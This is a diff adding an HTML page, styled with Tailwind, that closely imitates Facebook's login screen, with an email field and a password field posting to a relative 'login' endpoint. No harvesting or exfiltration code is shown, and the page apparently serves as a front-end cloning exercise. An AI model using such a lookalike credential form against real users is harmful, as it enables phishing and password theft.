@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="face.ico" type="image/x-icon">
+    <script src="https://cdn.tailwindcss.com"></script>
+    <title>Facebook -log in or sign up</title>
+</head>
+<body class="h-full w-full bg-gray-100 text-[#1c1e21] flex justify-center items-center font-['Helvetica', 'Arial', 'sans-serif']">
+    <div class="lg:flex lg:flex-row lg:justify-center lg:items-center lg:h-full lg:w-full sm:flex sm:flex-col sm:justify-center sm:items-center">
+        <div class="left lg:w-[500px] lg:mr-[80px] sm:flex sm:flex-col sm:justify-center sm:items-center sm:mb-[20px] sm:w-[350px] lg:flex lg:flex-col lg:justify-start lg:items-start">
+            <img src="facebook.svg" alt="Facebook-logo" class="h-[108px] ml-[-28px] mb-[-10px]"/>
+            <h2 class="lg:text-[28px] lg:leading-[1.1] lg:font-[500] sm:font-[500] sm:text-[21px]">Facebook helps you connect and share with the people in your life.</h2>
+        </div>
+        <div class="right lg:mt-[124px] sm:ml-[-20px]">
+            <div class="flex flex-row justify-center items-center bg-white p-[10px] w-[396px] shadow-xl shadow-black-400 border-t-[0.2px] border-gray-200 rounded-[10px]">
+                <form action="login" class="flex flex-col justify-center items-center w-full h-full p-[10px]">
+                    <div class="flex flex-col justify-center items-center w-full h-full">
+                        <input class="placeholder:text-[#cccdcf] w-full p-[10px] mb-[10px] text-[17px] border-solid border-2 border-[#dddfe2] rounded-[6px] focus:outline-none focus:border-blue-400" type="text" placeholder="Email address or phone number" required autofocus>
+                        <input class="placeholder:text-[#cccdcf] w-full p-[10px] mb-[10px] text-[17px] border-solid border-2 border-[#dddfe2] rounded-[6px] focus:outline-none focus:border-blue-400" type="password" name="Password" placeholder="Password" required>
+                    </div>
+                    <input class="cursor-pointer w-full py-[10px] px-[16px] mb-[20px] bg-[#1877f2] rounded-[6px] text-white text-[20px] font-bold tracking-[1px] hover:bg-blue-600" type="submit" name="Log In" value="Log In" />
+                    <a class="text-[#1877f2] text-[14px] mb-[20px] hover:underline" href="#" target="_blank">Forgotten password?</a>
+                    <hr class="w-full h-[2px] mb-[20px]">
+                    <input class="cursor-pointer py-[10px] px-[16px] mb-[7px] bg-[#42b72a] rounded-[6px] text-white text-[17px] font-bold tracking-[1px] hover:bg-green-600" type="button" value="Create New Account" />
+                </form>
+            </div>
+            <div class="mt-[28px] text-center">
+                <a class="font-bold text-[14px] hover:underline" href="#">Create a Page</a>
+                <span class="text-[14px]"> for a celebrity, brand or business.</span>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
